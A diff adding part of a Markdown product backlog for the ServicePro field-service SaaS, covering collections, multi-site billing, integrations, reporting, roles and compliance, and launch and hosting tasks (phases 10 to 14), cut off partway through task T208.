+**What it is** — A single place to work overdue accounts.
+
+**What it does** — Overdue invoices grouped by customer with contact info, last contact (T064), promise-to-pay (T065), reminder history (T034), one-click call log (T036) and send-statement (T189); sortable by amount/age.
+
+**Why we need it** — Collections is the wedge; this is its home screen.
+
+**Notes** — Old task (Feb 2026 TODO P1; confidence medium). Acceptance: all overdue accounts visible; contact info; log collection activity.
+
+---
+
+#### T064 — Add last contact date tracking on invoices
+
+**Phase**: 10 · **Category**: Feature · **Hours**: 2 · **Status**: Open · **v1 Gate**: No · **Depends on**: T037
+
+**What it is** — Each invoice shows when the customer was last contacted about it.
+
+**What it does** — Updated by reminders, calls (T036) and manual notes; visible and filterable in the collections view.
+
+**Why we need it** — Prevents pestering and ensures follow-up.
+
+**Notes** — Old task (Feb 2026 TODO P2). Acceptance: updated on contact, visible, filterable.
+
+---
+
+#### T065 — Add promise-to-pay notes
+
+**Phase**: 10 · **Category**: Feature · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — Record "I'll pay Friday" commitments with date and amount.
+
+**What it does** — Promise date + amount + note on the invoice; shown in collections; reminders pause until the date; alert when it passes unpaid.
+
+**Why we need it** — Turns phone promises into tracked follow-ups; the AI collections agent (T214) writes these too.
+
+**Notes** — Old task (Feb 2026 TODO P2). Acceptance: date and amount, visible in collections, alert when passed.
+
+---
+
+#### T186 — Multi-site customers (service locations; invoice per site or consolidated)
+
+**Phase**: 10 · **Category**: Feature · **Hours**: 16 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T102
+
+**What it is** — A customer can have many service locations, and jobs, quotes, agreements and invoices reference a site.
+
+**What it does** — `service_locations` (customer, address, access notes, site contact, tenant); migrate each existing customer address into a default site; site pickers on job/quote/agreement/invoice; billing per site or consolidated per customer (T188); site-level history.
+
+**Why we need it** — Commercial and property-manager customers have many properties — one address per customer (today) is a non-starter for the beachhead.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §0 (gaps), §4.3, §5 MVP #8.
+
+---
+
+#### T187 — PO capture and matching on jobs and invoices
+
+**Phase**: 10 · **Category**: Feature · **Hours**: 6 · **Status**: Open · **v1 Gate**: No · **Depends on**: T186
+
+**What it is** — Purchase-order numbers captured on jobs/quotes, required where the customer demands it, carried to invoices and tracked against PO amounts.
+
+**What it does** — PO field on jobs/quotes/agreements (invoices already have one); per-customer "PO required" flag blocking invoice send without it; PO amount and remaining balance across invoices.
+
+**Why we need it** — B2B customers reject invoices without the right PO.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §4.3, §5 v1.
+
+---
+
+#### T188 — Consolidated monthly invoicing
+
+**Phase**: 10 · **Category**: Feature · **Hours**: 8 · **Status**: Open · **v1 Gate**: No · **Depends on**: T186
+
+**What it is** — One invoice per customer (or site) per period covering all completed jobs.
+
+**What it does** — Billing preference per customer (per job / monthly consolidated); a scheduled run (or button) rolls up completed, uninvoiced jobs into one invoice with per-job/site sections; works with agreements (T167).
+
+**Why we need it** — Property managers and facilities want one invoice a month, not dozens.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §5 v1.
+
+---
+
+#### T189 — Statements of account (portal + email)
+
+**Phase**: 10 · **Category**: Feature · **Hours**: 6 · **Status**: Open · **v1 Gate**: No · **Depends on**: T184
+
+**What it is** — A statement per customer listing open invoices, payments and aging, sent monthly and available in the portal.
+
+**What it does** — Statement PDF (gofpdf) from the A/R data (T031); monthly email run; portal view (T184).
+
+**Why we need it** — Standard B2B collections document.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §5 v1.
+
+---
+
+#### T190 — Property-manager approval workflow (NTE limits, multi-approver, email intake)
+
+**Phase**: 10 · **Category**: Feature · **Hours**: 24 · **Status**: Open · **v1 Gate**: No · **Depends on**: T186, T184
+
+**What it is** — Property managers set not-to-exceed limits, approve work above them (with multiple approvers if needed), and can send work orders by email.
+
+**What it does** — NTE per customer/site/job; jobs or quotes over NTE require approval through the portal; approver lists and order; audit trail; inbound email address per tenant that parses PM work-order emails into requests (Resend inbound or Cloudflare Email Routing).
+
+**Why we need it** — Deep B2B workflow residential tools don't do — part of the niche moat.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §4.3, §5 v2.
+
+---
+
+#### T191 — Maintenance agreements with autopay + renewal reminders
+
+**Phase**: 10 · **Category**: Feature · **Hours**: 12 · **Status**: Open · **v1 Gate**: No · **Depends on**: T167, T171
+
+**What it is** — Service agreements bill automatically and remind customers before they renew.
+
+**What it does** — Agreement billing schedule (per visit or periodic) charged via autopay (T171); renewal reminder N days before end; renew/upgrade flow in the portal.
+
+**Why we need it** — Recurring revenue for customers; sticky for ServicePro.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §5 v2.
+
+---
+
+### Phase 11 — Integrations & Migration (T095, T096, T097, T098, T192, T193, T194, T195, T196, T197)
+
+QuickBooks (the #1 B2B buying gate), import mappers, and partner integrations instead of builds. **10 open tasks, ~103h.**
+
+- [ ] T095 — Build outgoing webhooks system
+- [ ] T096 — Build event log table
+- [ ] T097 — Add webhook retry logic
+- [ ] T098 — Document public API (OpenAPI/Swagger)
+- [ ] T192 — QuickBooks Online sync (customers, invoices, payments; one-way first)
+- [ ] T193 — Import mappers for Jobber / Housecall Pro exports + generic CSV
+- [ ] T194 — Zapier app
+- [ ] T195 — Wisetack consumer financing
+- [ ] T196 — Gusto payroll / timesheets
+- [ ] T197 — AI receptionist partner integration
+
+#### T095 — Build outgoing webhooks system
+
+**Phase**: 11 · **Category**: Integration · **Hours**: 12 · **Status**: Open · **v1 Gate**: No · **Depends on**: T096
+
+**What it is** — Tenants subscribe URLs to ServicePro events.
+
+**What it does** — Endpoint registry per tenant; event types from the T096 event log; HMAC-signed payloads; delivery log; SSRF guard (block private/link-local IPs, resolve-then-connect) since this creates the first user-configurable outbound calls.
+
+**Why we need it** — Integration foundation (Zapier T194, customer systems).
+
+**Notes** — Old task (Feb 2026 TODO P3). An unlinked `internal/api/handlers/webhooks` package exists (correctness audit 5.1) — evaluate before T129 deletes it. security audit "SSRF" (no user-configurable outbound webhooks exist today). Retry is T097.
+
+---
+
+#### T096 — Build event log table
+
+**Phase**: 11 · **Category**: Backend · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T102
+
+**What it is** — A tenant-scoped append-only table of significant domain events.
+
+**What it does** — `events (id, tenant_id, type, entity, entity_id, actor, payload, created_at)` written in the same transaction as the change; consumed by the timeline (T037/T055), webhooks (T095) and audit log (T093).
+
+**Why we need it** — Debugging and integration foundation.
+
+**Notes** — Old task (Feb 2026 TODO P3). Don't revive the unlinked `internal/analytics` event store (broken `ON CONFLICT` target, correctness audit 7.L).
+
+---
+
+#### T097 — Add webhook retry logic
+
+**Phase**: 11 · **Category**: Integration · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T095
+
+**What it is** — Failed webhook deliveries are retried with backoff and surfaced to the tenant.
+
+**What it does** — Exponential backoff with jitter over ~24h via the scheduled-jobs runner (T141); disable an endpoint after repeated failures and notify; manual redeliver from the log.
+
+**Why we need it** — Reliable event delivery.
+
+**Notes** — Old task (Feb 2026 TODO P3). Folds in the old "Future Features → Webhooks for Customers" item.
+
+---
+
+#### T098 — Document public API (OpenAPI/Swagger)
+
+**Phase**: 11 · **Category**: Docs · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: T152
+
+**What it is** — Published API docs and API keys for integrators.
+
+**What it does** — Partly done by T015 (swag → `swagger.json`, Swagger UI at `/api/docs`). Remaining: per-tenant API keys with scopes and rate limits; mark the public subset; publish static docs (Swagger UI is locked down in production by T114); versioning policy.
+
+**Why we need it** — Enables Zapier, the MCP server (T217) and partner integrations.
+
+**Notes** — Old task (Feb 2026 TODO P3). Folds in the old "Future Features → Public API for Integrations" item (OAuth2 for third-party apps later).
+
+---
+
+#### T192 — QuickBooks Online sync (customers, invoices, payments; one-way first)
+
+**Phase**: 11 · **Category**: Integration · **Hours**: 32 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T118, T102
+
+**What it is** — Customers, invoices and payments created in ServicePro appear in the tenant's QuickBooks Online.
+
+**What it does** — Intuit OAuth2 per tenant; mapping tables (customer, item/service, tax code, account); one-way push on create/update/payment with an error queue and retry; manual "resync"; Intuit app review. Two-way later.
+
+**Why we need it** — The #1 buying gate for B2B shops — their accountant lives in QuickBooks.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §2 row 22, §5 MVP #6.
+
+---
+
+#### T193 — Import mappers for Jobber / Housecall Pro exports + generic CSV
+
+**Phase**: 11 · **Category**: Integration · **Hours**: 8 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T186
+
+**What it is** — New tenants import customers, sites, jobs and open invoices from Jobber or Housecall Pro exports, or any CSV.
+
+**What it does** — Column mappers for each export format on top of the existing CSV import (`import_service.go`); preview + validation; tenant-scoped; size/row caps (security audit F-23) and the unchecked `json.Unmarshal` at `import_service.go:341` fixed.
+
+**Why we need it** — Switching friction is the main barrier; the white-glove migration offer (T220) relies on it.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §2 row 26, §5 MVP #9.
+
+---
+
+#### T194 — Zapier app
+
+**Phase**: 11 · **Category**: Integration · **Hours**: 12 · **Status**: Open · **v1 Gate**: No · **Depends on**: T095, T098
+
+**What it is** — A Zapier integration with ServicePro triggers and actions.
+
+**What it does** — Triggers: new customer, job completed, invoice sent, invoice paid; actions: create customer, create job/request. Auth via API keys (T098); triggers via outgoing webhooks (T095).
+
+**Why we need it** — Covers the long tail of integrations without building each.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §5 v2 "Integrations rather than builds".
+
+---
+
+#### T195 — Wisetack consumer financing
+
+**Phase**: 11 · **Category**: Integration · **Hours**: 8 · **Status**: Open · **v1 Gate**: No · **Depends on**: T183
+
+**What it is** — Customers can finance larger quotes through Wisetack from the approval page.
+
+**What it does** — Wisetack partner API; "pay over time" option on quotes above a threshold; status webhooks; payout reconciled to the invoice.
+
+**Why we need it** — Matters for big-ticket replacements; competitors have it.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §3 (about 3.9% merchant fee, 3rd-party figure). Less relevant to the B2B beachhead — confirm in T218 before building.
+
+---
+
+#### T196 — Gusto payroll / timesheets
+
+**Phase**: 11 · **Category**: Integration · **Hours**: 12 · **Status**: Open · **v1 Gate**: No · **Depends on**: T177
+
+**What it is** — Approved timesheets flow into Gusto payroll.
+
+**What it does** — Gusto OAuth; map ServicePro users to Gusto employees; push approved hours per pay period.
+
+**Why we need it** — Payroll is a common add-on in competitors; partner, don't build.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §3, §5 v2.
+
+---
+
+#### T197 — AI receptionist partner integration
+
+**Phase**: 11 · **Category**: Integration · **Hours**: 8 · **Status**: Open · **v1 Gate**: No · **Depends on**: T098, T185
+
+**What it is** — An AI answering/receptionist vendor can create requests and book jobs in ServicePro.
+
+**What it does** — Public booking/request API (T098 keys, T185 request model) and a partner guide; integrate with one vendor first.
+
+**Why we need it** — AI receptionists became a $29/mo commodity in ~12 months — integrate rather than build.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §1.2, §3, §4.1.
+
+---
+
+### Phase 12 — Reporting & Dashboards (T045, T046, T047, T066, T067, T068, T069, T070, T071, T084, T085, T086, T087, T088, T198)
+
+Dashboard widgets and reports from the old TODO plus job costing. All tenant-scoped and in tenant timezone/currency. **15 open tasks, ~53h.**
+
+- [ ] T045 — Add aging quotes dashboard widget
+- [ ] T046 — Add follow-up queue dashboard widget
+- [ ] T047 — Build "stuck work" report
+- [ ] T066 — Add technician utilization widget
+- [ ] T067 — Add quote conversion rate metric
+- [ ] T068 — Build job-completion-to-invoice time report
+- [ ] T069 — Build invoice-to-paid time report (DSO)
+- [ ] T070 — Build revenue by service type report
+- [ ] T071 — Build collections rate report
+- [ ] T084 — Build quote-to-job conversion report
+- [ ] T085 — Build lead-to-quote time report
+- [ ] T086 — Build quote-to-acceptance time report
+- [ ] T087 — Build revenue by technician report
+- [ ] T088 — Add comparative analysis (vs prior period)
+- [ ] T198 — Job costing / profit per job
+
+#### T045 — Add aging quotes dashboard widget
+
+**Phase**: 12 · **Category**: Reporting · **Hours**: 2 · **Status**: Open · **v1 Gate**: No · **Depends on**: T062
+
+**What it is** — A widget counting quotes pending longer than a threshold.
+
+**What it does** — Count of sent quotes older than 7/14/30 days (configurable); click-through to the filtered list.
+
+**Why we need it** — Quick visibility into a stale pipeline.
+
+**Notes** — Old task (Feb 2026 TODO). P1. Depends on quote aging (T062). All reports are tenant-scoped (T102) and use tenant timezone/currency (T099/T127).
+
+---
+
+#### T046 — Add follow-up queue dashboard widget
+
+**Phase**: 12 · **Category**: Reporting · **Hours**: 2 · **Status**: Open · **v1 Gate**: No · **Depends on**: T042
+
+**What it is** — A widget showing quotes and invoices needing follow-up today.
+
+**What it does** — Count from the follow-up queue (T042) and collections (T044); links to each.
+
+**Why we need it** — Daily action list at a glance.
+
+**Notes** — Old task (Feb 2026 TODO). P1. All reports are tenant-scoped (T102) and use tenant timezone/currency (T099/T127).
+
+---
+
+#### T047 — Build "stuck work" report
+
+**Phase**: 12 · **Category**: Reporting · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T033
+
+**What it is** — A report of work falling through the cracks.
+
+**What it does** — Three lists: completed-not-invoiced (T033 query), quotes without follow-up, overdue invoices without recent contact (T064); quick actions to unstick.
+
+**Why we need it** — Catches what slips between office and field.
+
+**Notes** — Old task (Feb 2026 TODO). P1; "stuck" definitions to confirm. All reports are tenant-scoped (T102) and use tenant timezone/currency (T099/T127).
+
+---
+
+#### T066 — Add technician utilization widget
+
+**Phase**: 12 · **Category**: Reporting · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T038
+
+**What it is** — Scheduled hours vs capacity per tech for today.
+
+**What it does** — Per-tech scheduled/available hours (T038) with under/over highlighting.
+
+**Why we need it** — Capacity planning.
+
+**Notes** — Old task (Feb 2026 TODO). P2; historical trend later. All reports are tenant-scoped (T102) and use tenant timezone/currency (T099/T127).
+
+---
+
+#### T067 — Add quote conversion rate metric
+
+**Phase**: 12 · **Category**: Reporting · **Hours**: 2 · **Status**: Open · **v1 Gate**: No · **Depends on**: T102
+
+**What it is** — Quote-to-job conversion rate on the dashboard.
+
+**What it does** — Accepted / sent over a configurable period with trend; the `v_quote_conversion` Grafana view (T026) has the logic.
+
+**Why we need it** — Business health indicator.
+
+**Notes** — Old task (Feb 2026 TODO). P2. All reports are tenant-scoped (T102) and use tenant timezone/currency (T099/T127).
+
+---
+
+#### T068 — Build job-completion-to-invoice time report
+
+**Phase**: 12 · **Category**: Reporting · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: T102
+
+**What it is** — Average days from job completed to invoice sent.
+
+**What it does** — From job and invoice timestamps; trend; period filter.
+
+**Why we need it** — Measures billing efficiency.
+
+**Notes** — Old task (Feb 2026 TODO). P2. All reports are tenant-scoped (T102) and use tenant timezone/currency (T099/T127).
+
+---
+
+#### T069 — Build invoice-to-paid time report (DSO)
+
+**Phase**: 12 · **Category**: Reporting · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: T118
+
+**What it is** — Days Sales Outstanding — average days to collect.
+
+**What it does** — DSO from invoice sent and payment dates (T118 makes payments trustworthy); trend over time.
+
+**Why we need it** — Key collections metric for the wedge.
+
+**Notes** — Old task (Feb 2026 TODO). P2. The old "industry comparison" criterion is dropped (no data source). All reports are tenant-scoped (T102) and use tenant timezone/currency (T099/T127).
+
+---
+
+#### T070 — Build revenue by service type report
+
+**Phase**: 12 · **Category**: Reporting · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: T118
+
+**What it is** — Revenue broken down by job/service type.
+
+**What it does** — Aggregate from paid invoice lines joined to job type / price-book category; chart; period filter. Compute from invoices/payments — `revenue_transactions` is never written, so the existing revenue reports always show $0.
+
+**Why we need it** — Shows where money comes from.
+
+**Notes** — Old task (Feb 2026 TODO). P2. Correctness audit 7.M11. All reports are tenant-scoped (T102) and use tenant timezone/currency (T099/T127).
+
+---
+
+#### T071 — Build collections rate report
+
+**Phase**: 12 · **Category**: Reporting · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: T118
+
+**What it is** — Percentage of billed revenue collected.
+
+**What it does** — Collected / billed per period with trend and breakdown by age bucket.
+
+**Why we need it** — Tracks bad debt.
+
+**Notes** — Old task (Feb 2026 TODO). P2. All reports are tenant-scoped (T102) and use tenant timezone/currency (T099/T127).
+
+---
+
+#### T084 — Build quote-to-job conversion report
+
+**Phase**: 12 · **Category**: Reporting · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: T067
+
+**What it is** — Detailed conversion analysis over time.
+
+**What it does** — Extends T067 with breakdown by service type, staff and value band.
+
+**Why we need it** — Sales effectiveness.
+
+**Notes** — Old task (Feb 2026 TODO). P3. All reports are tenant-scoped (T102) and use tenant timezone/currency (T099/T127).
+
+---
+
+#### T085 — Build lead-to-quote time report
+
+**Phase**: 12 · **Category**: Reporting · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: T102
+
+**What it is** — Average time from new customer/request to first quote.
+
+**What it does** — From customer/request creation to first quote sent.
+
+**Why we need it** — Measures sales speed.
+
+**Notes** — Old task (Feb 2026 TODO). P3; needs request tracking (T185) for real leads. All reports are tenant-scoped (T102) and use tenant timezone/currency (T099/T127).
+
+---
+
+#### T086 — Build quote-to-acceptance time report
+
+**Phase**: 12 · **Category**: Reporting · **Hours**: 2 · **Status**: Open · **v1 Gate**: No · **Depends on**: T102
+
+**What it is** — Average time for quotes to be accepted.
+
+**What it does** — From `sent_at` to `accepted_at`.
+
+**Why we need it** — Measures quote effectiveness.
+
+**Notes** — Old task (Feb 2026 TODO). P3. All reports are tenant-scoped (T102) and use tenant timezone/currency (T099/T127).
+
+---
+
+#### T087 — Build revenue by technician report
+
+**Phase**: 12 · **Category**: Reporting · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: T102
+
+**What it is** — Revenue attributed to each technician.
+
+**What it does** — Paid revenue by assigned tech(s) with split rules for multi-tech jobs; restricted to admin roles.
+
+**Why we need it** — Performance tracking.
+
+**Notes** — Old task (Feb 2026 TODO). P3; privacy considerations noted in the original. All reports are tenant-scoped (T102) and use tenant timezone/currency (T099/T127).
+
+---
+
+#### T088 — Add comparative analysis (vs prior period)
+
+**Phase**: 12 · **Category**: Reporting · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T102
+
+**What it is** — Period-over-period comparison on dashboard metrics and reports.
+
+**What it does** — "Revenue this month vs last month: +12%"; customizable date ranges; CSV export.
+
+**Why we need it** — Trend visibility.
+
+**Notes** — Old task (Feb 2026 TODO). P3. Folds in the old "Future Features → Dashboard KPI Improvements" item (ranges, export, comparison). All reports are tenant-scoped (T102) and use tenant timezone/currency (T099/T127).
+
+---
+
+#### T198 — Job costing / profit per job
+
+**Phase**: 12 · **Category**: Reporting · **Hours**: 12 · **Status**: Open · **v1 Gate**: No · **Depends on**: T168, T177
+
+**What it is** — Profit per job: revenue minus labor and materials cost.
+
+**What it does** — Labor cost from time entries (T177) × per-tech cost rate; material cost from price-book costs (T168); job and agreement profitability report; margin by service type.
+
+**Why we need it** — Owners don't know which jobs or contracts lose money; a known Jobber weakness.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §1.3 (Jobber "weak job costing"), §3.
+
+---
+
+### Phase 13 — Roles, Compliance & Trust (T074, T075, T092, T093, T094, T199, T200, T201)
+
+Remaining roles, audit logging, MFA, and the export/deletion promises that back the trust brand. **8 open tasks, ~48h.**
+
+- [ ] T074 — Create Accountant role
+- [ ] T075 — Add field-level permission controls
+- [ ] T092 — Implement 2FA (TOTP)
+- [ ] T093 — Implement comprehensive audit logging
+- [~] T094 — Add Google OAuth sign-in (Won't Do — superseded by T158)
+- [ ] T199 — One-click full data export (trust promise)
+- [ ] T200 — Account/tenant deletion + data retention policy
+- [ ] T201 — Privacy/CCPA handling SOP
+
+#### T074 — Create Accountant role
+
+**Phase**: 13 · **Category**: Auth · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: T104
+
+**What it is** — A view-only role for bookkeepers/CPAs covering all financial data.
+
+**What it does** — Include: view invoices, payments, financial reports, export. Exclude: create/edit customers, modify jobs, change settings. CLAUDE.md permission steps.
+
+**Why we need it** — Lets owners give their bookkeeper access safely.
+
+**Notes** — Old task (Feb 2026 TODO P2). Acceptance: role created; all financial data visible; no modification.
+
+---
+
+#### T075 — Add field-level permission controls
+
+**Phase**: 13 · **Category**: Auth · **Hours**: 12 · **Status**: Open · **v1 Gate**: No · **Depends on**: T035
+
+**What it is** — Specific fields (prices, balances, costs) are hidden from roles without financial permission, in every API response.
+
+**What it does** — Response shaping by permission (serializers per role or a field-permission map) applied to customers, jobs, quotes, invoices; configurable visibility per tenant; tests proving no leakage via list/detail/export.
+
+**Why we need it** — "Tech can't see 'customer owes $5,000 overdue'" must hold everywhere, not just in the UI.
+
+**Notes** — Old task (Feb 2026 TODO P2; confidence medium). T035 does the minimum for technicians.
+
+---
+
+#### T092 — Implement 2FA (TOTP)
+
+**Phase**: 13 · **Category**: Auth · **Hours**: 6 · **Status**: Open · **v1 Gate**: No · **Depends on**: T158
+
+**What it is** — Users can protect their account with an authenticator app; admins can require it.
+
+**What it does** — After T158, enable Supabase Auth MFA (TOTP) in the sign-in screens, recovery codes, and a per-tenant "require MFA for admins" setting checked by the API (AAL claim). Before T158 don't build in-house TOTP.
+
+**Why we need it** — Security for accounts that control money flows.
+
+**Notes** — Old task (Feb 2026 TODO P3). Folds in the old "Future Features → Two-Factor Authentication" item. Effort likely drops below the estimate with Supabase.
+
+---
+
+#### T093 — Implement comprehensive audit logging
+
+**Phase**: 13 · **Category**: Backend · **Hours**: 12 · **Status**: Open · **v1 Gate**: No · **Depends on**: T096
+
+**What it is** — Who changed what, when, and from where, for all business data — searchable and exportable.
+
+**What it does** — Audit entries (actor, tenant, entity, before/after diff, IP via T107, request ID via T223) written in the change transaction; admin search and CSV export; retention policy (T200).
+
+**Why we need it** — Compliance, dispute resolution and debugging.
+
+**Notes** — Old task (Feb 2026 TODO P3; confidence medium). Folds in the old "Future Features → Audit Logging" item.
+
+---
+
+#### T094 — Add Google OAuth sign-in
+
+**Phase**: 13 · **Category**: Auth · **Hours**: 0 · **Status**: Won't Do · **v1 Gate**: No · **Depends on**: none
+
+**Why we won't do this** — Superseded by T158 — Supabase Auth provides Google sign-in. Revisit only if T158 is abandoned.
+
+---
+
+#### T199 — One-click full data export (trust promise)
+
+**Phase**: 13 · **Category**: Feature · **Hours**: 6 · **Status**: Open · **v1 Gate**: No · **Depends on**: T128
+
+**What it is** — A tenant owner downloads all their data (CSV/JSON per entity plus PDFs and attachments) in one ZIP.
+
+**What it does** — Background export (T128 infra) of every tenant-owned table and R2 object; emailed link; documented format; available on every plan.
+
+**Why we need it** — "Your data leaves with one click" is a core brand promise against lock-in-heavy incumbents.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §4.2 (3), §4.5.
+
+---
+
+#### T200 — Account/tenant deletion + data retention policy
+
+**Phase**: 13 · **Category**: Legal · **Hours**: 6 · **Status**: Open · **v1 Gate**: No · **Depends on**: T199
+
+**What it is** — Owners can delete their tenant; data is purged on a documented schedule.
+
+**What it does** — Owner-initiated deletion with export offered first (T199) and a 30-day grace period; cascade delete of rows and R2 objects; Connect account detached; backups age out per the backup retention; written retention policy linked from the privacy policy.
+
+**Why we need it** — Required for trust and privacy compliance; the no-contract promise means easy exit.
+
+**Notes** — LL D6/T237 pattern.
+
+---
+
+#### T201 — Privacy/CCPA handling SOP
+
+**Phase**: 13 · **Category**: Legal · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — A written procedure for privacy requests, for ServicePro's own users and for end-customer data held on tenants' behalf.
+
+**What it does** — privacy@ inbox; 45-day response SLA; steps for access/deletion; processor role for tenants' customer data (DPA template); log of requests.
+
+**Why we need it** — Required for any US users; manual handling is permitted.
+
+**Notes** — LL `docs/ops/ccpa-sop.md` is the template.
+
+---
+
+### Phase 14 — Hosting & Launch Readiness (T202, T203, T204, T205, T206, T207, T208, T209, T210, T211, T212, T213)
+
+Provision and launch. **Blocked on T202** (production DB host) — ServicePro stays local-only until the owner decides. **12 open tasks, ~35h.**
+
+- [ ] T202 — Decide production database hosting (OWNER DECISION)
+- [ ] T203 — GCP project + WIF + Artifact Registry + Cloud Run service
+- [ ] T204 — Deploy the Worker + DNS for servicepro.sharkfins.xyz
+- [ ] T205 — Invite-gated preview launch
+- [ ] T206 — Production email domain on Resend (SPF/DKIM/DMARC)
+- [ ] T207 — Terms of Service + Privacy Policy legal review
+- [ ] T208 — Support inbox + Better Stack status page
+- [ ] T209 — Activate nightly backups to R2 + restore drill
+- [ ] T210 — ServicePro plans & billing: Solo/Team/Pro flat, unlimited users, founding offer
+- [ ] T211 — Update Fleet and the blog when ServicePro goes live
+- [ ] T212 — Production config review
+- [ ] T213 — Cost guardrails (Cloud Run max instances × DB pool, budget alerts)
+
+#### T202 — Decide production database hosting (OWNER DECISION)
+
+**Phase**: 14 · **Category**: Research · **Hours**: 1 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
+
+**What it is** — The owner picks where production Postgres lives.
+
+**What it does** — Options (2026-10-16): (a) a separate Supabase org on Pro, $25/mo; (b) upgrade the existing org to Pro, ~$45/mo; (c) a `servicepro` schema inside an existing Supabase project, $0 but shared limits, backups and blast radius; (d) Neon free tier (0.5 GB, autosuspend cold starts, no Supabase Auth — T158 would need another plan). Record the decision as a D-item, update Fleet, then unblock T203 and T158. Also fixes the region (OD-8).
+
+**Why we need it** — Blocked: the Supabase free tier is full (2 active projects). Everything from T203 on, and Supabase Auth, waits on this; until then ServicePro stays local-only.
+
+**Notes** — OD-1; D3.
+
+---
+
+#### T203 — GCP project + WIF + Artifact Registry + Cloud Run service
+
+**Phase**: 14 · **Category**: Deploy · **Hours**: 4 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T202, T143
+
+**What it is** — A GCP project with keyless GitHub deploys and a capped Cloud Run service `servicepro-api`.
+
+**What it does** — Project, region next to the DB; Artifact Registry `servicepro` with a keep-5 cleanup policy; Workload Identity Federation pool pinned to this repo + `gh-deploy` SA; runtime SA; Secret Manager secrets (DATABASE_URL, Stripe, Resend, R2, EDGE_PROXY_SECRET, INTERNAL_JOBS_SECRET, Sentry, PostHog); Cloud Run with `--max-instances` cap and min 0; budget with email alerts at 50/90/100%; GitHub vars for T146. Follow `docs/ops/cloud-run-setup.md` (T151).
+
+**Why we need it** — The API needs somewhere to run; LL's pattern is proven and cheap at this scale.
+
+**Notes** — D3; infra audit §5. Cost caps detailed in T213.
+
+---
+
+#### T204 — Deploy the Worker + DNS for servicepro.sharkfins.xyz
+
+**Phase**: 14 · **Category**: Deploy · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T150, T203, T107
+
+**What it is** — `https://servicepro.sharkfins.xyz` serves the frontend and proxies `/api/*` and `/version` to Cloud Run.
+
+**What it does** — Custom domain route on the `sharkfins.xyz` zone; `API_ORIGIN` = run.app URL; `EDGE_PROXY_SECRET` set as a Worker secret and in Secret Manager (same value); first `wrangler deploy` via T146; Stripe webhook endpoint updated to the new host; backend `FRONTEND_URL` and CORS updated.
+
+**Why we need it** — The user-facing address and the edge path T106/T107 rely on.
+
+**Notes** — D3. Per CLAUDE.md, adding the domain triggers T211.
+
+---
+
+#### T205 — Invite-gated preview launch
+
+**Phase**: 14 · **Category**: Deploy · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T106, T204, T206
+
+**What it is** — The first invited tenants can sign up and use ServicePro at the production URL.
+
+**What it does** — Confirm all of Phase 1 is done; create the first sign-up invites (super_admin path from T106); smoke test sign-up → tenant → customer → quote → job → invoice → pay; watch Sentry for a week.
+
+**Why we need it** — Real usage from the T218 interviewees is what validates the beachhead.
+
+**Notes** — Requires every Phase 1 task.
+
+---
+
+#### T206 — Production email domain on Resend (SPF/DKIM/DMARC)
+
+**Phase**: 14 · **Category**: Email · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T159
+
+**What it is** — Transactional email sends from a verified ServicePro domain with SPF, DKIM and DMARC passing.
+
+**What it does** — Verify a sending subdomain in Resend; add DNS records on Cloudflare; DMARC at `p=none` with reporting, tighten later; set `RESEND_FROM_EMAIL`; test deliverability to Gmail/Outlook.
+
+**Why we need it** — Reminders and invoices that land in spam defeat the collections wedge.
+
+**Notes** — D2 (Resend).
+
+---
+
+#### T207 — Terms of Service + Privacy Policy legal review
+
+**Phase**: 14 · **Category**: Legal · **Hours**: 4 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
+
+**What it is** — Final Terms and Privacy Policy reviewed and published, replacing the draft placeholders.
+
+**What it does** — Draft from a reputable template covering: payments via Stripe Connect (ServicePro not merchant of record if direct charges, OD-4), SMS consent, data processing for tenants' customers, export/deletion (T199/T200), subprocessors list; review; publish with a fixed effective date.
+
+**Why we need it** — Required before charging anyone or processing their customers' data.
+
+**Notes** — frontend audit §7 (placeholders with "Last updated: today"). T138 marks the current pages as drafts in the meantime.
+
+---
+
+#### T208 — Support inbox + Better Stack status page
+
+**Phase**: 14 · **Category**: Ops · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T204
+
+**What it is** — A support address that reaches the owner and a public status page.
+
